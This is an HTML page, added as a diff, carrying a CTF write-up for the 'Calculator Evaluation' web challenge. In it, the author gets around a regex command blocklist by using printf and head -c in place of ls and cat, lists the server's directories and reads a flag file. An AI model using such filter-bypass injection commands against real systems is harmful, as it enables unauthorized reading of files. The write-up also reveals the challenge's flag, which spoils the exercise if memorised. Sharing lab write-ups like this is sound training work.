@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Writeup</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    <link rel="stylesheet" href="/style.css"/>
+    
+  </head>
+     
+  <body>
+    <!--Navigation Bar-->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+      <a class="navbar-brand" href="/index.html">Hackin7</a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarText">
+        <ul class="navbar-nav mr-auto">
+
+          <li class="nav-item active">
+            <a class="nav-link" href="/about.html">About</a></li>
+           <li><a class="nav-link" href="/achievements.html">Achievements</a></li>
+            <li><a class="nav-link" href="/links.html">CTF Writeups</a></li>
+          
+        </ul>
+      </div>
+    </nav>
+    
+    <div>
+    <link href='/github-markdown-css/github-css.css' rel='stylesheet' type='text/css'><div class='github_markdown' style='width:80wh;'><div><a href='https://github.com/Hackin7/Programming-Crappy-Solutions/blob/master/Cyber Security/Capture the Flag Competitions/2021/Sieberrsec CTF 2.0/Training/Calculator Revaluation/README.md'>Original Github Link</a></div><h1>Calculator Evaluation</h1>
+<p>Web, 100</p>
+<h3>Description</h3>
+<p>So, my friend got mad because you managed to read his secret. He went to update his website...</p>
+<p>Find the new calculator app <a href="challs.sieberrsec.tech:4588/calcv2.html">here</a>.</p>
+<p>P.S. He told me he recently learnt about regex. Not sure what that points to.</p>
+<p>Original Challenge Author: xzy_10</p>
+<p>Original Challenge Author: xzy_10</p>
+<h2>Solution</h2>
+<h3>Inspecting Webpage</h3>
+<p>First, viewing the page source gives me this comment</p>
+<pre><code>&lt;html&gt;
+	&lt;head&gt;
+		&lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+
+		&lt;h1&gt;Calculator App V2!&lt;/h1&gt;
+		&lt;h2&gt;Updated to improve security!&lt;/h2&gt;
+
+		&lt;form action=&quot;calcv2.php&quot; method=&quot;get&quot;&gt;
+			Number to be added: &lt;input type=&quot;text&quot; name=&quot;value&quot;&gt;&lt;br&gt;
+		&lt;input type=&quot;submit&quot; value=&quot;Add!&quot; class=&quot;button&quot;&gt;
+		&lt;/form&gt;
+		&lt;!--
+		OMG regex is sooooooo powerful! The | really makes it so easy to check for each linux command!
+		All right! I have disabled the linux commands! I hope I have covered all of the commands though...
+		--&gt;
+		&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3>Using Alternative Linux Commands</h3>
+<p>My first thought was that it was a similar challenge from before, the <code>Calculator Evaluation</code> Challenge. I copied over my script and tried testing linux commands. I made some minor tweaks (not much, just formatting issues) and tested it.</p>
+<pre><code>&gt; ls
+ee my 
+&gt; !!!
+&lt;html&gt;
+&lt;head&gt;
+  &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+
+&lt;h1&gt; 
+Calculator App V2!
+&lt;/h1&gt;
+&lt;h3&gt;No listing! Can't let you see my secrets!&lt;/h3&gt;
+&gt; cat
+(?^-?-^?)&lt;/h3&gt;&lt;h3&gt;A cat blocks your way! It's sleeping... Better not 
+&gt; echo
+e!&lt;/h2&gt;&lt;h3&gt;Hey there!&lt;/h3&gt;&lt;h4&gt;Hey there!&lt;/h4&gt;&lt;h5&gt;Hey there!&lt;/h5&gt;&lt;h6&gt;He
+&gt; sh
+
+&gt; lmao
+
+&gt;
+</code></pre>
+<p>Looks like they don't give a proper result. The comment makes me think that maybe we can use alternative commands. I googled for an alternative to <code>ls</code> and tried it, which ended up working</p>
+<pre><code>&gt; printf &quot;%s\n&quot; *
+calcv2.html
+calcv2.php
+styles.css
+
+&gt; 
+</code></pre>
+<p>I also found a substitute for <code>cat</code> from <a href="https://stackoverflow.com/questions/218912/linux-command-like-cat-to-read-a-specified-quantity-of-characters">here</a></p>
+<pre><code>&gt; head -c 100 styles.css
+@import url('https://fonts.googleapis.com/css2?family=Hind:wght@500;600&amp;display=swap');
+
+
+
+h1 {
+
+	fo
+</code></pre>
+<h3>Traversing the file system</h3>
+<p>I just used my 2 new useful commands to traverse everything</p>
+<pre><code>&gt; printf &quot;%s\n&quot; ./*
+./calcv2.html
+./calcv2.php
+./styles.css
+
+&gt; printf &quot;%s\n&quot; ../*
+../calc-reval
+../secrets1782956
+
+&gt; 
+
+&gt; printf &quot;%s\n&quot; ../*
+../calc-reval
+../secrets1782956
+
+&gt; printf &quot;%s\n&quot; ../secrets1782956*
+../secrets1782956
+
+&gt; printf &quot;%s\n&quot; ../secrets1782956/*
+../secrets1782956/flag
+
+&gt; head -c 1000 ../secrets1782956/flag
+IRS{sAn1t1sE_3V3RYTH1NG!_n0T_Ju5T_th3_c0mM0n_0n35!}
+
+
+&gt; 
+</code></pre>
+<p>Good 20 min challenge I guess. Most of the time was just admin and writing this writeup</p>
+<h2>Flag</h2>
+<p><code>IRS{sAn1t1sE_3V3RYTH1NG!_n0T_Ju5T_th3_c0mM0n_0n35!}</code></p>
+</div>
+    </div>
+    
+  </body>
+</html>
